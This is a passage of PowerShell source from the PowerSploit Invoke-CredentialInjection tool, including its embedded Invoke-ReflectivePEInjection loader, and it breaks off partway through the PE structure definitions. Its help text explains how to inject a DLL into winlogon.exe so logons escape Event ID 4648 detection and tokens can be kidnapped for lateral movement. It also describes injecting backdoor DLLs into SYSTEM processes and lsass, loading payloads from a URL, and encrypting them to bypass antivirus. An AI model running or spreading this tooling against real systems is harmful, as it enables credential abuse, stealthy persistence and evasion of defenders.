function Invoke-CredentialInjection
{
    <#
    .SYNOPSIS

    This script allows an attacker to create logons with clear-text credentials without triggering a suspicious Event ID 4648 (Explicit Credential Logon).
    The script either creates a suspended winlogon.exe process running as SYSTEM, or uses an existing WinLogon process. Then, it injects a DLL in to 
    winlogon.exe which calls LsaLogonUser to create a logon from within winlogon.exe (which is where it is called from when a user logs in using RDP or 
    logs on locally). The injected DLL then impersonates the new logon token with its current thread so that it can be kidnapped using Invoke-TokenManipulation.

    PowerSploit Function: Invoke-CredentialInjection
    Author: Joe Bialek, Twitter: @JosephBialek
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

    This script allows an attacker to create logons with clear-text credentials without triggering a suspicious Event ID 4648 (Explicit Credential Logon).
    The script either creates a suspended winlogon.exe process running as SYSTEM, or uses an existing WinLogon process. Then, it injects a DLL in to 
    winlogon.exe which calls LsaLogonUser to create a logon from within winlogon.exe (which is where it is called from when a user logs in using RDP or 
    logs on locally). The injected DLL then impersonates the new logon token with its current thread so that it can be kidnapped using Invoke-TokenManipulation.

    .PARAMETER NewWinLogon

    Switch. Specifies that this script should create a new WinLogon.exe process. This may be suspicious, as log correlation can show winlogon.exe was 
    created by PowerShell.exe. This CANNOT be used if the script is run from Session 0 (winlogon requires a desktop is available, and session 0 doesn't have one).

    .PARAMETER ExistingWinLogon

    Switch. Specifies that this script should use an existing WinLogon.exe process. This will leave behind code (a reflectively loaded DLL) in the process.

    .PARAMETER DomainName

    The domain name of the user account.

    .PARAMETER UserName

    The username to log in with.

    .PARAMETER Password

    The password of the user.

    .PARAMETER LogonType

    The logon type of the injected logon. Can be Interactive, RemoteInteractive, or NetworkCleartext

    .PARAMETER AuthPackage

    The authentication package to use. Default is Kerberos. Msv1_0 can be specified but should only be used for local accounts (which can't use kerberos).

	
    .EXAMPLE

    Invoke-CredentialInjection -DomainName "demo" -UserName "administrator" -Password "Password1" -NewWinLogon

    Creates a new winlogon process (as the SYSTEM account) and creates a logon from within the process as demo\administrator. The logon will default to
    RemoteInteractive (an RDP logon). Defaults to using the Kerberos provider.

    .EXAMPLE

    Invoke-CredentialInjection -DomainName "demo" -UserName "administrator" -Password "Password1" -ExistingWinLogon -LogonType NetworkCleartext

    Uses an existing winlogon process and creates a loogn from within it as demo\administrator. The logon will be type NetworkCleartext (used in basic auth
    and PowerShell w/ CredSSP). Defaults to using the Kerberos provider.

    .EXAMPLE

    Invoke-CredentialInjection -DomainName "demo" -UserName "administrator" -Password "Password1" -NewWinLogon -AuthPackage Msv1_0

    Creates a new winlogon process (as the SYSTEM account) and creates a logon from within the process as demo\administrator. The logon will default to 
    RemoteInteractive (and RDP logon). The logon will use the Msv1_0 auth package (NTLM).

    .NOTES
    Normally when you do a RunAS logon, the EventID 4648 will show your current account, current process, and the account you are logging in with.
    Incident responders use this to look for lateral movement. They can see a random user logging in with high privilege credentials, which stands out.
    This script allows you to create the logon from within winlogon.exe, as SYSTEM. This allows you to create 4648 event logs which make it appear that the
    user logged in using RDP or logged in locally, rather than the logon showing up as a suspicious RunAS. Then you can use token kidnapping, such as the
    Invoke-TokenManipulation script to kidnap the security token. This token can then be used to authenticate over the network for pivoting and other post
    exploitation.

    .LINK

    Blog: http://clymb3r.wordpress.com/
    Github repo: https://github.com/clymb3r/PowerShell

    #>

    [CmdletBinding()]
    Param(
        [Parameter(ParameterSetName = "NewWinLogon", Position = 0)]
	    [Switch]
	    $NewWinLogon,

        [Parameter(ParameterSetName = "ExistingWinLogon", Position = 0)]
	    [Switch]
	    $ExistingWinLogon,

        [Parameter(Position=1, Mandatory=$true)]
        [String]
        $DomainName,

        [Parameter(Position=2, Mandatory=$true)]
        [String]
        $UserName,

        [Parameter(Position=3, Mandatory=$true)]
        [String]
        $Password,

        [Parameter()]
        [ValidateSet("Interactive","RemoteInteractive", "NetworkCleartext")]
        [String]
        $LogonType = "RemoteInteractive",

        [Parameter()]
        [ValidateSet("Kerberos","Msv1_0")]
        [String]
        $AuthPackage = "Kerberos"
    )

    Set-StrictMode -Version 2




    function Invoke-ReflectivePEInjection
    {
    <#
    .SYNOPSIS

    This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, 
    or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, 
    please lead the Notes section (GENERAL NOTES) for information on how to use them.


    1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
    Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.

    This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
    this will load and execute the DLL/EXE in to memory without writing any files to disk.


    2.) Reflectively load a DLL in to memory of a remote process.
    As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.

    This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
    from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the 
    remote process. 


    While this script provides functionality to specify a file to load from disk or from a URL, these are more for demo purposes. The way I'd recommend using the script is to create a byte array
    containing the file you'd like to reflectively load, and hardcode that byte array in to the script. One advantage of doing this is you can encrypt the byte array and decrypt it in memory, which will
    bypass A/V. Another advantage is you won't be making web requests. The script can also load files from SQL Server and be used as a SQL Server backdoor. Please see the Casaba
    blog linked below (thanks to whitey).

    PowerSploit Function: Invoke-ReflectivePEInjection
    Author: Joe Bialek, Twitter: @JosephBialek
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    Version: 1.1

    .DESCRIPTION

    Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.

    .PARAMETER PEPath

    The path of the DLL/EXE to load and execute. This file must exist on the computer the script is being run on, not the remote computer.

    .PARAMETER PEUrl

    A URL containing a DLL/EXE to load and execute.

    .PARAMETER ComputerName

    Optional, an array of computernames to run the script on.

    .PARAMETER FuncReturnType

    Optional, the return type of the function being called in the DLL. Default: Void
	    Options: String, WString, Void. See notes for more information.
	    IMPORTANT: For DLLs being loaded remotely, only Void is supported.
	
    .PARAMETER ExeArgs

    Optional, arguments to pass to the executable being reflectively loaded.
	
    .PARAMETER ProcName

    Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

    .PARAMETER ProcId

    Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.
	
    .EXAMPLE

    Load DemoDLL from a URL and run the exported function WStringFunc on the current system, print the wchar_t* returned by WStringFunc().
    Note that the file name on the website can be any file extension.
    Invoke-ReflectivePEInjection -PEUrl http://yoursite.com/DemoDLL.dll -FuncReturnType WString

    .EXAMPLE

    Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
    Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName Target.local

    .EXAMPLE

    Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
	    the wchar_t* returned by WStringFunc() from all the computers.
    Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)

    .EXAMPLE

    Load DemoEXE and run it locally.
    Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs "Arg1 Arg2 Arg3 Arg4"

    .EXAMPLE

    Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
    Invoke-ReflectivePEInjection -PEPath DemoDLL_RemoteProcess.dll -ProcName lsass -ComputerName Target.Local

    .NOTES
    GENERAL NOTES:
    The script has 3 basic sets of functionality:
    1.) Reflectively load a DLL in to the PowerShell process
	    -Can return DLL output to user when run remotely or locally.
	    -Cleans up memory in the PS process once the DLL finishes executing.
	    -Great for running pentest tools on remote computers without triggering process monitoring alerts.
	    -By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
    2.) Reflectively load an EXE in to the PowerShell process.
	    -Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
	    -Cleans up memory in the PS process once the DLL finishes executing.
	    -Great for running existing pentest tools which are EXE's without triggering process monitoring alerts.
    3.) Reflectively inject a DLL in to a remote process.
	    -Can NOT return DLL output to the user when run remotely OR locally.
	    -Does NOT clean up memory in the remote process if/when DLL finishes execution.
	    -Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
	    -Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.



    DLL LOADING NOTES:

    PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
    If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
    return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
    remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
    applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.

    For DLL Loading:
    Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled "YOUR CODE GOES HERE"
    I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
    the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
    returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
    wchar_t*   : FuncReturnType = WString
    char*      : FuncReturnType = String
    void       : Default, don't supply a FuncReturnType

    For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don't simply convert a string
    using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.

    The function name expected in the DLL for the prewritten FuncReturnType's is as follows:
    WString    : WStringFunc
    String     : StringFunc
    Void       : VoidFunc

    These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
    be declared as follows:
    extern "C" __declspec( dllexport ) wchar_t* WStringFunc()


    If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
    this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".

    Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection

    .LINK

    Blog: http://clymb3r.wordpress.com/
    Github repo: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection

    Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
    Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
    Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/

    #>

    [CmdletBinding()]
    Param(
	    [Parameter(Mandatory = $true)]
	    [Byte[]]
	    $Bytes32,
	
	    [Parameter(Mandatory = $true)]
	    [Byte[]]
	    $Bytes64,
	
	    [Parameter(Position = 1)]
	    [String[]]
	    $ComputerName,
	
	    [Parameter(Position = 2)]
        [ValidateSet( 'WString', 'String', 'Void' )]
	    [String]
	    $FuncReturnType = 'Void',
	
	    [Parameter(Position = 3)]
	    [String]
	    $ExeArgs,
	
	    [Parameter(Position = 4)]
	    [Int32]
	    $ProcId,
	
	    [Parameter(Position = 5)]
	    [String]
	    $ProcName
    )

    Set-StrictMode -Version 2


    $RemoteScriptBlock = {
	    [CmdletBinding()]
	    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [Byte[]]
		    $PEBytes,
		
		    [Parameter(Position = 1, Mandatory = $false)]
		    [String]
		    $FuncReturnType,
				
		    [Parameter(Position = 2, Mandatory = $false)]
		    [Int32]
		    $ProcId,
		
		    [Parameter(Position = 3, Mandatory = $false)]
		    [String]
		    $ProcName
	    )
	
	    ###################################
	    ##########  Win32 Stuff  ##########
	    ###################################
	    Function Get-Win32Types
	    {
		    $Win32Types = New-Object System.Object

		    #Define all the structures/enums that will be used
		    #	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		    $Domain = [AppDomain]::CurrentDomain
		    $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		    $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		    ############    ENUM    ############
		    #Enum MachineType
		    $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		    $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		    $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		    $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		    $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		    $MachineType = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		    #Enum MagicType
		    $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		    $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		    $MagicType = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		    #Enum SubSystemType
		    $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		    $SubSystemType = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		    #Enum DllCharacteristicsType
		    $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		    $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		    $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		    $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		    $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		    $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		    $DllCharacteristicsType = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		    ###########    STRUCT    ###########
		    #Struct IMAGE_DATA_DIRECTORY
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		    ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		    ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		    $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		    #Struct IMAGE_FILE_HEADER
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		    $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		    $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		    #Struct IMAGE_OPTIONAL_HEADER64
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		    ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		    ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		    ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		    ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		    ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		    ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		    ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		    ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		    ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		    ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		    ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		    ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		    ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		    ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		    ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		    ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		    ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		    ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		    ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		    ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		    ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		    ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		    ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		    ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		    ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		    ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		    ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		    ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		    ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		    ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		    ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		    ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		    ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		    ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		    ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		    ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		    $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		    #Struct IMAGE_OPTIONAL_HEADER32
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		    ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		    ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		    ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		    ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		    ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		    ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		    ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		    ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		    ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		    ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		    ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		    ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		    ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		    ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		    ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		    ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		    ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		    ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		    ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		    ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		    ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		    ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		    ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		    ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		    ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		    ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		    ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		    ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		    ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		    ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		    ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		    ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		    ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		    ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		    ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		    ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		    ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
